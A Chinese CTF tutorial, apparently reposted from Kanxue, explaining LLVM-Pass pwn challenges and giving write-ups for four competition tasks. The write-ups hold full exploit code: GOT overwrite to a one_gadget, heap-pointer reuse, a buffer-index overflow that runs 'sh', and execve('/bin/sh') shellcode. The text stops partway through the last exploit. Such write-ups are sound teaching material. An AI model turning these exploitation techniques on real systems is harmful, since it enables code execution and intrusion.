> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.kanxue.com](https://bbs.kanxue.com/thread-282211.htm)

> [原创] 深入二进制安全：LLVM-Pass

LLVM-PASS
=========

Ciscn2021 和 2022 都有一道名为 Satool 的题目，它是 LLVM-PASS 类 Pwn 题。

由于高版本 glibc 的 IO 题比较模板化，近两年 ciscn 半决赛对 LLVM-PASS 等逆向难度较高的题目也都有所涉及。

本科期间在《编译原理》这门课学习过 LLVM 的一些基础知识，这里系统的总结下 LLVM-PASS 在二进制安全中的应用。

简介
--

### LLVM

LLVM 是构架编译器 (compiler) 的框架系统，以 C++ 编写而成，用于优化以任意程序语言编写的程序的编译时间 (compile-time)、链接时间(link-time)、运行时间(run-time) 以及空闲时间(idle-time)，对开发者保持开放，并兼容已有脚本。

**简单来说，LLVM 是编译器框架，用于优化编写的程序。**

LLVM 又分为前端和后端：

*   前端：经过词法分析、语法分析、语义分析等环节，将**源代码**转换为 **IR 中间代码**。
*   后端：经过指令选择、指令调度、寄存器分配等环境，将 **IR 中间代码**转换为**可执行的二进制代码或汇编代码**。

其中，LLVM-IR 有三种形式：

*   **.ll** 格式：介于高级语言和汇编语言之间，人类可以阅读的文本。
*   **.bc** 格式：bitcode，不可读，适合机器存储的二进制文件。
*   内存表示：保存在内存中，无法被看到。

通过下面的命令可以实现不同格式代码互相转换：

```
.c -> .ll：clang -emit-llvm -S a.c -o a.ll
.c -> .bc: clang -emit-llvm -c a.c -o a.bc
.ll -> .bc: llvm-as a.ll -o a.bc
.bc -> .ll: llvm-dis a.bc -o a.ll
.bc -> .s: llc a.bc -o a.s

```

### LLVM-PASS

PASS 是一种结构化技术，通常作用于 **IR 中间代码**，通过 **opt** 利用写好的 so 库**优化**已有的 IR 中间代码。

其中，opt 是 LLVM 的优化器和分析器，可以加载指定的模块，对 LLVM IR 或 LLVM 字节码进行分析和优化。

CTF 题目一般会给出 opt，通过`./opt --version`查看版本，或在 README.md 文档中告知 opt 版本。

LLVM 核心库中提供了一些可以继承的 pass 类，可以对 IR 中间代码遍历实现代码优化、代码插桩等操作。

而 LLVM-PASS 类的 pwn 题，就是利用这一过程中可能出现的漏洞。

`LLVM PASS`类题目都会给出一个`xxx.so`，即自定义的`LLVM PASS`模块，漏洞点就自然会出现在其中。

我们可以使用`opt -load ./xxx.so -xxx ./exp.{ll/bc}`命令加载模块并启动`LLVM`的优化分析（其中`-xxx`是`xxx.so`中注册的`PASS`的名称，`README`文档中一般会给出，也可以通过逆向`PASS`模块得到）。（注意，新版本需要加`-enable-new-pm=0 -f`参数）

需要注意的是，若题目给了`opt`文件，就用题目指定的`opt`文件启动`LLVM`并调试（如命令`./opt-8 ...`），直接使用`opt-8 ...`命令是用的系统安装的`opt`，可能会和题目所给的有不同。

在打远程的时候，与`Kernel`和`QEMU`逃逸的题类似：将`exp.ll`或`exp.bc`通过`base64`加密传输到远程服务器，远程服务器会解码，并将得到的`LLVM IR`传给`LLVM`运行。

环境安装
----

通过 apt 安装二进制安全中常用的三个版本 clang 和 llvm：

```
sudo apt install clang-8
sudo apt install llvm-8
  
sudo apt install clang-10
sudo apt install llvm-10
  
sudo apt install clang-12
sudo apt install llvm-12

```

安装好`llvm`后，可在`/usr/lib/llvm-xx/bin/opt`路径下找到对应`llvm`版本的`opt`文件（一般不开`PIE`保护）。

![](https://image.xxxb.cn/blog/image-20240610101033014.png)

编写 LLVM-PASS
------------

官方文档：[https://llvm.org/docs/WritingAnLLVMPass.html](https://llvm.org/docs/WritingAnLLVMPass.html)

这里直接引用 **Winmt 师傅**编写的 LLVM-Pass Demo 和关键语法解释：

```
// Hello.cpp
#include "llvm/Pass.h"
#include "llvm/IR/Function.h"
#include "llvm/IR/Constants.h"
#include "llvm/IR/BasicBlock.h"
#include "llvm/IR/Instructions.h"
#include "llvm/Support/raw_ostream.h"
#include "llvm/IR/LegacyPassManager.h"
#include "llvm/Transforms/IPO/PassManagerBuilder.h"
using namespace llvm;
  
namespace {
  struct Hello : public FunctionPass {
    static char ID;
    Hello() : FunctionPass(ID) {}
    bool runOnFunction(Function &F) override {
      errs() << "Hello: ";
      errs().write_escaped(F.getName()) << '\n';
      SymbolTableList::const_iterator bbEnd = F.end();
      for(SymbolTableList::const_iterator bbIter = F.begin(); bbIter != bbEnd; ++bbIter){
         SymbolTableList::const_iterator instIter = bbIter->begin();
         SymbolTableList::const_iterator instEnd  = bbIter->end();
         for(; instIter != instEnd; ++instIter){
            errs() << "OpcodeName = " << instIter->getOpcodeName() << " NumOperands = " << instIter->getNumOperands() << "\n";
            if (instIter->getOpcode() == 56)
            {
                if(const CallInst* call_inst = dyn_cast(instIter)) {
                    errs() << call_inst->getCalledFunction()->getName() << "\n";
                    for (int i = 0; i < instIter->getNumOperands()-1; i++)
                    {
                        if (isa(call_inst->getOperand(i)))
                        {
                            errs() << "Operand " << i << " = " << dyn_cast(call_inst->getArgOperand(i))->getZExtValue() << "\n";
                        }
                    }
                }
            }
         }
      }
      return false;
    }
  };
}
  
char Hello::ID = 0;
  
// Register for opt
static RegisterPass X("Hello", "Hello World Pass");
  
// Register for clang
static RegisterStandardPasses Y(PassManagerBuilder::EP_EarlyAsPossible,
  [](const PassManagerBuilder &Builder, legacy::PassManagerBase &PM) {
    PM.add(new Hello());
  }); 
```

通过下面的命令编译为 LLVMHello.so 模块（llvm 安装后的可执行文件在 / usr/lib/llvm-xx/bin / 目录）：

```
clang-12 `/usr/lib/llvm-12/bin/llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `/usr/lib/llvm-12/bin/llvm-config --ldflags`

```

上述代码中的`Hello`结构体继承了`LLVM`核心库中的`FunctionPass`类，并重写了其中的`runOnFunction`函数（一般的`CTF`题都是如此）。`runOnFunction`函数在`LLVM`遍历到每一个传入的`LLVM IR`中的函数时都会被调用。

下面解释一下上述代码中的一些常用`LLVM`语法：

1.  `getName()`函数用于获取当前`runOnFunction`正处理的函数名
2.  第一个`for`循环是对当前处理的函数中的基本块（比如一些条件分支语句就会产生多个基本块，在生成的`ll`文件中，不同基本块之间会有换行）遍历，第二个`for`循环是对每个基本块中的指令遍历
3.  getOpcodeName() 函数用于获取指令的操作符的名称，getNumOperands() 用于获取指令的操作数的个数，getOpcode() 函数用于获取指令的操作符编号，在 / usr/include/llvm-xx/llvm/IR/Instruction.def 文件中有对应表，可以看到，56 号对应着 Call 这个操作符。
4.  当在一个`A`函数中调用了`B`函数，在`LLVM IR`中，`A`会通过`Call`操作符调用`B`，`getCalledFunction()`函数就是用于获取此处`B`函数的名称
5.  `getOperand(i)`是用于获取第`i`个操作数（在这里就是获取所调用函数的第`i`个参数），`getArgOperand()`函数与其用法类似，但只能获取参数，`getZExtValue()`即`get Zero Extended Value`，也就是将获取的操作数转为无符号扩展整数
6.  再看到最内层`for`循环中的`instIter->getNumOperands()-1`，这里需要`-1`是因为对于`call`和`invoke`操作符，操作数的数量是实际参数的个数`+1`（因为将被调用者也当成了操作数）
7.  `if (isa<ConstantInt>(call_inst->getOperand(i)))`这行语句是通过`isa`判断当前获取到的操作数是不是立即数（`ConstantInt`）
8.  `static RegisterPass<Hello> X("Hello", "Hello World Pass");`中的第一个参数就是注册的`PASS`名称

逆向分析 so 模块
----------

一般来说，CTF 题目中的 LLVM-Pass 也重写 FunctionPass 类中的 runOnFunction 函数。

拿到一个 so 模块，我们首先需要定位 runOnFunction 函数，漏洞点一般就在其中。

找到. data.rel.ro 模块末尾的 vtable：

<img src="[https://image.xxxb.cn/blog/image-20240610104031503.png](https://image.xxxb.cn/blog/image-20240610104031503.png)"alt="image-20240610104031503" />

最后一项即重写的 runOnFunction 函数，而 PASS 注册的名称一般会在 README.md 文件中给出。

如果没有给出，可以对__cxa_atexit 函数交叉引用来定位。

gdb 动态调试 so 模块
--------------

首先用 gdb 调试 opt，并用`set args`设置参数传入，然后在 main 函数下断点后运行。

![](https://image.xxxb.cn/blog/image-20240610104633664.png)

程序运行后，会先 call 一些初始化函数：

![](https://image.xxxb.cn/blog/image-20240610104743662.png)

然后执行真正的代码加载 so 模块：

![](https://image.xxxb.cn/blog/image-20240610105025763.png)

此时，so 模块被加载到程序中：

![](https://image.xxxb.cn/blog/image-20240610105047744.png)

opt 通过下面这条调用链重写 runOnFunction 函数：

```
run -> runOnModule -> runOnFunction

```

例题
--

### 红帽杯 - 2021 simpleVM

题目给了 opt-8、libc-2.31.so 和 VMPass.so 文件：

![](https://image.xxxb.cn/blog/image-20240610105544406.png)

显然是 LLVM-Pass 类题目，并且 opt 的版本为 8，我们将 VMPass.so 拖入 IDA 分析：

![](https://image.xxxb.cn/blog/image-20240610105838733.png)

根据对__cxa_atexit 函数交叉引用发现模块名为 VMPass。

定位到上图中的 runOnFunction 函数，首先调用 getName 获取当前函数名，然后判断函数名是否为`o0o0o0o0`。

如果函数名为`o0o0o0o0`则调用`memcmp(Name, "o0o0o0o0", v5)`，然后根据是否调用 memcpy 调用 sub_6AC0(a1, a2)。

显而易见，关键函数为 sub_6AC0(a1, a2)，我们需要传入的函数名为`o0o0o0o0`。

继续分析 sub_6AC0 函数：

![](https://image.xxxb.cn/blog/image-20240610110247186.png)

这段代码遍历所有函数，然后遍历每个函数的块并将每个块作为参数调用 sub_6B80 函数，继续跟进分析：

![](https://image.xxxb.cn/blog/image-20240610110445566.png)

对于 pop、push、store、load、add、min 函数调用会做出不同的处理，以 pop 为例：

```
if ( !strcmp(funcName, "pop") )
{
    if ( (unsigned int)llvm::CallBase::getNumOperands(callInstruction) == 2 )
    {
        ArgOperand = llvm::CallBase::getArgOperand(callInstruction, 0);
        v32 = 0LL;
        v31 = (llvm::ConstantInt *)llvm::dyn_cast(ArgOperand);
        if ( v31 )
        {
            ZExtValue = llvm::ConstantInt::getZExtValue(v31);
            if ( ZExtValue == 1 )
                v32 = off_20DFD0;
            if ( ZExtValue == 2 )
                v32 = off_20DFC0;
        }
        if ( v32 )
        {
            v3 = off_20DFD8;
            *v32 = *(_QWORD *)*off_20DFD8;
            *v3 = (char *)*v3 - 8;
        }
    }
} 
```

所有的函数第一个参数为 int 类型，值为 1 或 2，确定操作哪个全局变量。

这两个全局变量 1 和 2 中存储地址，因此是二级指针类型的变量。

对于 push 函数，实现压栈操作，将全局变量 i 的值压入栈中。

对于 pop 函数，实现弹栈操作，将栈顶元素弹出到全局变量 i 中。

对于 store 函数，实现任意地址写，将全局变量 i 指向的地址处的值赋值给全局变量 k。

对于 load 函数，实现任意地址读，将全局变量 i 存储的地址赋值给全局变量 k 指向的地址处。

对于 add 函数，实现加法操作。对于 min 函数，实现减法操作。

可以考虑通过任意地址读泄露 got 表中函数地址，以此泄露 libc 基地址。

然后通过 add、min 函数对其进行修改，再利用任意地址写劫持 got 表为 one_gadget。

exp 如下所示：

```
// clang-8 -emit-llvm -S exp.c -o exp.ll
void add(int num, long long val);
void min(int num, long long val);
void load(int num);
void store(int num);
 
void o0o0o0o0()
{
    add(1, 0x77e100);
    load(1);
    add(2, 0x4942e);
    // add(1, 0x870);
    min(1, 0x100);
    store(1);
}

```

### Ciscn2021-satool

分析方法同上，找到模块名为 SApass。然后找到 vtable 最后一项函数：

![](https://image.xxxb.cn/blog/image-20240610135827019.png)

字符串为 r0oDkc4B，转为小端序为 B4ckDo0r。

根据 compare 函数，可以大概把程序划分为 save、takeaway、stealkey、fakeway 函数四个部分。

由于反编译后的代码都很奇怪，需要结合动态调试来分析。

动态调试发现 save 主要执行这段代码：

```
v32 = malloc(0x18uLL);
v32[2] = byte_2040f8;
byte_2040f8 = v32;
 
v33 = (char *)src;
memcpy(v32, src, v31);
 
v34 = v32 + 1;
v35 = (char *)v84[0];
memcpy(v34, v84[0], (size_t)v84[1]);

```

即将参数 1 和参数 2 分别放入 fd、bk 中，v32 和 byte_2040f8 是 0x20 大小 chunk 的指针。

takeaway 函数比较复杂，但是好像没有什么用。

stealkey 函数代码比较简单，将 0x20 大小 chunk 的值赋值给全局变量。

fakekey 函数也比较简单，将全局变量的值加上参数值，然后赋值回到 chunk 中。

run 函数最简单，直接 call *chunk。

思路很明显，先通过 save 函数创建 chunk，然后将 fd 指针的值放到全局变量，加上偏移到 one_gadget 后写回 chunk。

最后调用 run 函数执行 one_gadget。这里的关键是 fd 位置能否是 libc 上的值？

经过调试发现，程序初始状态有很多 chunk。我们可以申请完 tcache 后从 small bin 或 unsorted bin 中取 chunk。

然后绕过第一个 memcpy，这样申请到的 chunk 的 fd 指针位置就会有残留的 libc 地址。

![](https://image.xxxb.cn/blog/image-20240610153435636.png)

完整 exp 如下所示：

```
void save(char* a, char* b);
void stealkey();
void fakekey(int offset);
void run();
 
void B4ckDo0r()
{
    save(0, "bbbb");
    save(0, "bbbb");
    stealkey();
    fakekey(-0x5c30f2);
    run();
}

```

### 强网杯 2022-YakaGame

按照之前的方法，发现模块名为 ayaka。函数名为 gamestart。

![](https://image.xxxb.cn/blog/image-20240610163301691.png)

这道题比起来 Ciscn2021-satool 简单多了，因为代码可读性非常高，而且做多了 LLVM-PASS 发现很多代码语法都是相似的。

fight 函数，传入参数 index，若 weaponList[index] > 5000，scroe = weaponList[index] - 5000，否则失败。

若 score > 0x12345678 触发后门函数，执行 system(cmd)。cmd 开始时被初始化为 [0x92, 0x68, 0x7B, 0x27, 0x6D, 0x93, 0x68, 0x66]。

merge 函数，执行`weaponlist[merge_arg1] += weaponlist[merge_arg2]`。

destory 函数，执行`weaponlist[destory_arg1] = 0`。

upgrade 函数，执行 256 次`weaponlist[i] += upgrade_arg1;`。

wuxiangdeyidao 函数，执行`--boss`和异或操作，其中 boss 即 bss 段初始化为 5000 的全局变量。

```
--boss;
for ( m = 0; m < 8; ++m )
    cmd[m] ^= 0x14u;

```

zhanjinniuza 函数，执行下面的操作：

```
boss -= 2;
for ( n = 0; n < 8; ++n )
    cmd[n] ^= 0x7Fu;

```

guobapenhuo 函数，执行下面的操作：

```
boss -= 3;
for ( ii = 0; ii < 8; ++ii )
    cmd[ii] -= 9;

```

tiandongwanxiang 函数，执行下面的操作：

```
boss -= 80;
for ( jj = 0; jj < 8; ++jj )
    cmd[jj] += 2;

```

若为其它函数，会进入最后一个代码块：

若当前函数第一次调用，会执行 map[func_name] = arg 加入 map 成员。

若当前函数不是第一次调用，会执行 weaponlist[idx] = map[func_name]。

通过这个函数，我们可以实现任意地址写。更有意思的是：

![](https://image.xxxb.cn/blog/image-20240610171307584.png)

weaponlist、score 和 cmd 在 bss 段相邻，而 idx 是 char 类型变量，可以让它发生整数溢出。

从而覆盖 score 指针，让其指向很大的数，并覆盖 cmd 为 sh 字符串地址。完整 exp 如下所示：

```
void simplicity001(int arg);
void simplicity002(int arg);
void simplicity003(int arg);
void simplicity004(int arg);
void simplicity005(int arg);
void simplicity006(int arg);
void simplicity007(int arg);
void simplicity008(int arg);
void simplicity009(int arg);
void simplicity010(int arg);
void simplicity011(int arg);
void simplicity012(int arg);
void simplicity013(int arg);
void simplicity014(int arg);
void simplicity015(int arg);
void simplicity016(int arg);
void simplicity017(int arg);
void simplicity018(int arg);
void simplicity019(int arg);
void simplicity020(int arg);
void simplicity021(int arg);
void simplicity022(int arg);
void simplicity023(int arg);
void simplicity024(int arg);
void simplicity025(int arg);
void simplicity026(int arg);
void simplicity027(int arg);
void simplicity028(int arg);
void simplicity029(int arg);
void simplicity030(int arg);
void simplicity031(int arg);
void simplicity032(int arg);
void simplicity033(int arg);
void simplicity034(int arg);
void simplicity035(int arg);
void simplicity036(int arg);
void simplicity037(int arg);
void simplicity038(int arg);
void simplicity039(int arg);
void simplicity040(int arg);
void simplicity041(int arg);
void simplicity042(int arg);
void simplicity043(int arg);
void simplicity044(int arg);
void simplicity045(int arg);
void simplicity046(int arg);
void simplicity047(int arg);
void simplicity048(int arg);
void simplicity049(int arg);
void simplicity050(int arg);
void simplicity051(int arg);
void simplicity052(int arg);
void simplicity053(int arg);
void simplicity054(int arg);
void simplicity055(int arg);
void simplicity056(int arg);
void simplicity057(int arg);
void simplicity058(int arg);
void simplicity059(int arg);
void simplicity060(int arg);
void simplicity061(int arg);
void simplicity062(int arg);
void simplicity063(int arg);
void simplicity064(int arg);
void simplicity065(int arg);
void simplicity066(int arg);
void simplicity067(int arg);
void simplicity068(int arg);
void simplicity069(int arg);
void simplicity070(int arg);
void simplicity071(int arg);
void simplicity072(int arg);
void simplicity073(int arg);
void simplicity074(int arg);
void simplicity075(int arg);
void simplicity076(int arg);
void simplicity077(int arg);
void simplicity078(int arg);
void simplicity079(int arg);
void simplicity080(int arg);
void simplicity081(int arg);
void simplicity082(int arg);
void simplicity083(int arg);
void simplicity084(int arg);
void simplicity085(int arg);
void simplicity086(int arg);
void simplicity087(int arg);
void simplicity088(int arg);
void simplicity089(int arg);
void simplicity090(int arg);
void simplicity091(int arg);
void simplicity092(int arg);
void simplicity093(int arg);
void simplicity094(int arg);
void simplicity095(int arg);
void simplicity096(int arg);
void simplicity097(int arg);
void simplicity098(int arg);
void simplicity099(int arg);
void simplicity100(int arg);
void simplicity101(int arg);
void simplicity102(int arg);
void simplicity103(int arg);
void simplicity104(int arg);
void simplicity105(int arg);
void simplicity106(int arg);
void simplicity107(int arg);
void simplicity108(int arg);
void simplicity109(int arg);
void simplicity110(int arg);
void simplicity111(int arg);
void simplicity112(int arg);
void simplicity113(int arg);
void simplicity114(int arg);
void simplicity115(int arg);
void simplicity116(int arg);
void simplicity117(int arg);
void simplicity118(int arg);
void simplicity119(int arg);
void simplicity120(int arg);
void simplicity121(int arg);
void simplicity122(int arg);
void simplicity123(int arg);
void simplicity124(int arg);
void simplicity125(int arg);
void simplicity126(int arg);
void simplicity127(int arg);
void simplicity128(int arg);
void simplicity129(int arg);
void simplicity130(int arg);
void simplicity131(int arg);
void simplicity132(int arg);
void simplicity133(int arg);
void simplicity134(int arg);
void simplicity135(int arg);
void simplicity136(int arg);
void simplicity137(int arg);
void simplicity138(int arg);
void simplicity139(int arg);
void simplicity140(int arg);
void simplicity141(int arg);
void simplicity142(int arg);
void simplicity143(int arg);
void simplicity144(int arg);
void simplicity145(int arg);
void simplicity146(int arg);
void simplicity147(int arg);
void simplicity148(int arg);
void simplicity149(int arg);
void simplicity150(int arg);
void simplicity151(int arg);
void simplicity152(int arg);
void simplicity153(int arg);
void simplicity154(int arg);
void simplicity155(int arg);
void simplicity156(int arg);
void simplicity157(int arg);
void simplicity158(int arg);
void simplicity159(int arg);
void simplicity160(int arg);
void simplicity161(int arg);
void simplicity162(int arg);
void simplicity163(int arg);
void simplicity164(int arg);
void simplicity165(int arg);
void simplicity166(int arg);
void simplicity167(int arg);
void simplicity168(int arg);
void simplicity169(int arg);
void simplicity170(int arg);
void simplicity171(int arg);
void simplicity172(int arg);
void simplicity173(int arg);
void simplicity174(int arg);
void simplicity175(int arg);
void simplicity176(int arg);
void simplicity177(int arg);
void simplicity178(int arg);
void simplicity179(int arg);
void simplicity180(int arg);
void simplicity181(int arg);
void simplicity182(int arg);
void simplicity183(int arg);
void simplicity184(int arg);
void simplicity185(int arg);
void simplicity186(int arg);
void simplicity187(int arg);
void simplicity188(int arg);
void simplicity189(int arg);
void simplicity190(int arg);
void simplicity191(int arg);
void simplicity192(int arg);
void simplicity193(int arg);
void simplicity194(int arg);
void simplicity195(int arg);
void simplicity196(int arg);
void simplicity197(int arg);
void simplicity198(int arg);
void simplicity199(int arg);
void simplicity200(int arg);
void simplicity201(int arg);
void simplicity202(int arg);
void simplicity203(int arg);
void simplicity204(int arg);
void simplicity205(int arg);
void simplicity206(int arg);
void simplicity207(int arg);
void simplicity208(int arg);
void simplicity209(int arg);
void simplicity210(int arg);
void simplicity211(int arg);
void simplicity212(int arg);
void simplicity213(int arg);
void simplicity214(int arg);
void simplicity215(int arg);
void simplicity216(int arg);
void simplicity217(int arg);
void simplicity218(int arg);
void simplicity219(int arg);
void simplicity220(int arg);
void simplicity221(int arg);
void simplicity222(int arg);
void simplicity223(int arg);
void simplicity224(int arg);
void simplicity225(int arg);
void simplicity226(int arg);
void simplicity227(int arg);
void simplicity228(int arg);
void simplicity229(int arg);
void simplicity230(int arg);
void simplicity231(int arg);
void simplicity232(int arg);
void simplicity233(int arg);
void simplicity234(int arg);
void simplicity235(int arg);
void simplicity236(int arg);
void simplicity237(int arg);
void simplicity238(int arg);
void simplicity239(int arg);
void simplicity240(int arg);
void simplicity241(int arg);
 
void gamestart()
{
    simplicity001(0);
    simplicity002(0);
    simplicity003(0);
    simplicity004(0);
    simplicity005(0);
    simplicity006(0);
    simplicity007(0);
    simplicity008(0);
    simplicity009(0);
    simplicity010(0);
    simplicity011(0);
    simplicity012(0);
    simplicity013(0);
    simplicity014(0);
    simplicity015(0);
    simplicity016(0);
    simplicity017(0);
    simplicity018(0);
    simplicity019(0);
    simplicity020(0);
    simplicity021(0);
    simplicity022(0);
    simplicity023(0);
    simplicity024(0);
    simplicity025(0);
    simplicity026(0);
    simplicity027(0);
    simplicity028(0);
    simplicity029(0);
    simplicity030(0);
    simplicity031(0);
    simplicity032(0);
    simplicity033(0);
    simplicity034(0);
    simplicity035(0);
    simplicity036(0);
    simplicity037(0);
    simplicity038(0);
    simplicity039(0);
    simplicity040(0);
    simplicity041(0);
    simplicity042(0);
    simplicity043(0);
    simplicity044(0);
    simplicity045(0);
    simplicity046(0);
    simplicity047(0);
    simplicity048(0);
    simplicity049(0);
    simplicity050(0);
    simplicity051(0);
    simplicity052(0);
    simplicity053(0);
    simplicity054(0);
    simplicity055(0);
    simplicity056(0);
    simplicity057(0);
    simplicity058(0);
    simplicity059(0);
    simplicity060(0);
    simplicity061(0);
    simplicity062(0);
    simplicity063(0);
    simplicity064(0);
    simplicity065(0);
    simplicity066(0);
    simplicity067(0);
    simplicity068(0);
    simplicity069(0);
    simplicity070(0);
    simplicity071(0);
    simplicity072(0);
    simplicity073(0);
    simplicity074(0);
    simplicity075(0);
    simplicity076(0);
    simplicity077(0);
    simplicity078(0);
    simplicity079(0);
    simplicity080(0);
    simplicity081(0);
    simplicity082(0);
    simplicity083(0);
    simplicity084(0);
    simplicity085(0);
    simplicity086(0);
    simplicity087(0);
    simplicity088(0);
    simplicity089(0);
    simplicity090(0);
    simplicity091(0);
    simplicity092(0);
    simplicity093(0);
    simplicity094(0);
    simplicity095(0);
    simplicity096(0);
    simplicity097(0);
    simplicity098(0);
    simplicity099(0);
    simplicity100(0);
    simplicity101(0);
    simplicity102(0);
    simplicity103(0);
    simplicity104(0);
    simplicity105(0);
    simplicity106(0);
    simplicity107(0);
    simplicity108(0);
    simplicity109(0);
    simplicity110(0);
    simplicity111(0);
    simplicity112(0);
    simplicity113(0);
    simplicity114(0);
    simplicity115(0);
    simplicity116(0);
    simplicity117(0);
    simplicity118(0);
    simplicity119(0);
    simplicity120(0);
    simplicity121(0);
    simplicity122(0);
    simplicity123(0);
    simplicity124(0);
    simplicity125(0);
    simplicity126(0);
    simplicity127(0);
    simplicity128(0);
    simplicity129(0);
    simplicity130(0);
    simplicity131(0);
    simplicity132(0);
    simplicity133(0);
    simplicity134(0);
    simplicity135(0);
    simplicity136(0);
    simplicity137(0);
    simplicity138(0);
    simplicity139(0);
    simplicity140(0);
    simplicity141(0);
    simplicity142(0);
    simplicity143(0);
    simplicity144(0);
    simplicity145(0);
    simplicity146(0);
    simplicity147(0);
    simplicity148(0);
    simplicity149(0);
    simplicity150(0);
    simplicity151(0);
    simplicity152(0);
    simplicity153(0);
    simplicity154(0);
    simplicity155(0);
    simplicity156(0);
    simplicity157(0);
    simplicity158(0);
    simplicity159(0);
    simplicity160(0);
    simplicity161(0);
    simplicity162(0);
    simplicity163(0);
    simplicity164(0);
    simplicity165(0);
    simplicity166(0);
    simplicity167(0);
    simplicity168(0);
    simplicity169(0);
    simplicity170(0);
    simplicity171(0);
    simplicity172(0);
    simplicity173(0);
    simplicity174(0);
    simplicity175(0);
    simplicity176(0);
    simplicity177(0);
    simplicity178(0);
    simplicity179(0);
    simplicity180(0);
    simplicity181(0);
    simplicity182(0);
    simplicity183(0);
    simplicity184(0);
    simplicity185(0);
    simplicity186(0);
    simplicity187(0);
    simplicity188(0);
    simplicity189(0);
    simplicity190(0);
    simplicity191(0);
    simplicity192(0);
    simplicity193(0);
    simplicity194(0);
    simplicity195(0);
    simplicity196(0);
    simplicity197(0);
    simplicity198(0);
    simplicity199(0);
    simplicity200(0);
    simplicity201(0);
    simplicity202(0);
    simplicity203(0);
    simplicity204(0);
    simplicity205(0);
    simplicity206(0);
    simplicity207(0);
    simplicity208(0);
    simplicity209(0);
    simplicity210(0);
    simplicity211(0);
    simplicity212(0);
    simplicity213(0);
    simplicity214(0);
    simplicity215(0);
    simplicity216(0);
    simplicity217(0);
    simplicity218(0);
    simplicity219(0);
    simplicity220(0);
    simplicity221(0);
    simplicity222(0);
    simplicity223(0);
    simplicity224(0);
    simplicity225(0);
    simplicity226(0);
    simplicity227(0);
    simplicity228(0);
    simplicity229(0);
    simplicity230(0);
    simplicity231(0);
    simplicity232(0);
    simplicity233(0x6B);
    simplicity234(0X69);
    simplicity235(0X44);
    simplicity236(0);
    simplicity237(0);
    simplicity238(0);
    simplicity239(0);
    simplicity240(0);
    simplicity241(0x90);
 
    simplicity241(0x90);    // score pointer
 
    // sh\x00
    simplicity233(0x6B);
    simplicity234(0x69);
    simplicity235(0x44);
    simplicity236(0x00);
}

```

这里有个坑调试了 1 个多小时，map 里是按字典序进行排的！

### Ciscn2022-satool

分析发现模块名为 mba，并且对函数名没有要求。

![](https://image.xxxb.cn/blog/image-20240610184642950.png)

核心代码在这个地方，先设置为可读可写，然后设置为可读可执行，最后 call 调用。

然后分析一下这个 handler 函数：

![](https://image.xxxb.cn/blog/image-20240610202615896.png)

先来分析几个程序实现的关键函数，分析一下关键函数 writeMovImm64：

![](https://image.xxxb.cn/blog/image-20240610202706794.png)

this+5 应该为当前的指针 ptr，这个函数根据在内存中写入`48 BB [arg]` 或 `48 B8 [arg]`，10 字节的汇编指令。

经过分析发现对应的汇编代码为：

![](https://image.xxxb.cn/blog/image-20240610203413449.png)

即 writeMovImm64(this, 0, arg) 是 movaps rax arg。

继续分析 writeRet 函数，发现是在末尾写 ret 指令：

![](https://image.xxxb.cn/blog/image-20240610203650556.png)

![](https://image.xxxb.cn/blog/image-20240610203621165.png)

继续分析 writeInc 函数，发现是对 rax 寄存器进行 inc 或 dec 操作：

![](https://image.xxxb.cn/blog/image-20240610203912142.png)

![](https://image.xxxb.cn/blog/image-20240610203949556.png)

继续分析 writeOpReg 函数，发现是进行 rax = rax + rbx 或 rax = rax - rbx 操作：

![](https://image.xxxb.cn/blog/image-20240610204100321.png)

了解了所有函数的工作，对整个 handler 的流程进行分析。

首先，为我们的 shellcode 汇编代码区域设置了边界，大小为 0xFF0。

然后，判断末尾指令第一个操作数是否为常数，若为常数，执行 writeMovImm64(this, 0, SExtValue) 和 writeRet(this)。

接着，判断末尾指令第一个操作数是否为函数参数，若为函数参数，执行 writeMovImm64(this, 0, SExtValue) 和 writeRet(this)。

如果都不是，说明为变量。执行 else 中的代码，先执行 writeMovImm64(this, 0, 0LL)。

然后将操作数压入栈中，找到这个变量对应的指令行，只能为 add 或 sub 指令，然后取指令的操作数：

*   若操作数为 + 1 或 - 1 执行 writeInc()，否则执行 writeMovImm64 和 writeOpReg。
*   如果不是常数也不是参数，说明是变量，压入栈中。

动态调试发现成功写入汇编代码，并且初始值全部为 ret：

![](https://image.xxxb.cn/blog/image-20240611090346784.png)

movabs 和 add 命令共占 0xd 字节，(0xff0 - 0xa) / 0xd = 313。可以先使用 313 次填充完 0xFF0 大小的边界区域。

不过经过动态调试，有 315 个指令时会溢出几个字节：

![](https://image.xxxb.cn/blog/image-20240611092846355.png)

如果将最后一条指令的数据部分修改为 jmp 指令，第二次执行完 0xff0 大小区域后会 ret 执行这个数据部分。

然后在之前的部分填充 shellcode 即可：

![](https://image.xxxb.cn/blog/image-20240611094145755.png)

需要注意的是 shellcode 必须分段填充进去，每句指令不能超过 6 字节，留 2 个字节 jmp 到下一个指令：

```
from pwn import*
context(os = 'linux', arch = 'amd64')
  
shellcode = [
    "mov edi, 0x68732f6e",
    "shl rdi, 24",
    "mov ebx, 0x69622f",
    "add rdi, rbx",
    "push rdi",
    "push rsp",
    "pop rdi",
    "xor rsi, rsi",
    "xor rdx, rdx",
    "push 59",
    "pop rax",
    "syscall"
]
  
for sc in shellcode:
    print(u64(asm(sc).ljust(6, b'\x90') + b'\xEB\xEB'))
  
print(u16(b'\xEB\xE4')) # 最后超出0xff0字节部分的跳转指令

```

完整 exp 如下所示：

```
; ModuleID = 'exp.c'
source_filename = "exp.c"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"
 
; Function Attrs: noinline nounwind optnone uwtable
define dso_local i64 @payload1(i64 %0) #0 {
    %2 = add nsw i64 %0, 58603
    %3 = add nsw i64 %2, 1024
    %4 = add nsw i64 %3, 1024
    %5 = add nsw i64 %4, 1024
    %6 = add nsw i64 %5, 1024
    %7 = add nsw i64 %6, 1024
    %8 = add nsw i64 %7, 1024
    %9 = add nsw i64 %8, 1024
    %10 = add nsw i64 %9, 1024
    %11 = add nsw i64 %10, 1024
    %12 = add nsw i64 %11, 1024
    %13 = add nsw i64 %12, 1024
    %14 = add nsw i64 %13, 1024
    %15 = add nsw i64 %14, 1024
    %16 = add nsw i64 %15, 1024
    %17 = add nsw i64 %16, 1024
    %18 = add nsw i64 %17, 1024
    %19 = add nsw i64 %18, 1024
    %20 = add nsw i64 %19, 1024
    %21 = add nsw i64 %20, 1024
    %22 = add nsw i64 %21, 1024
    %23 = add nsw i64 %22, 1024
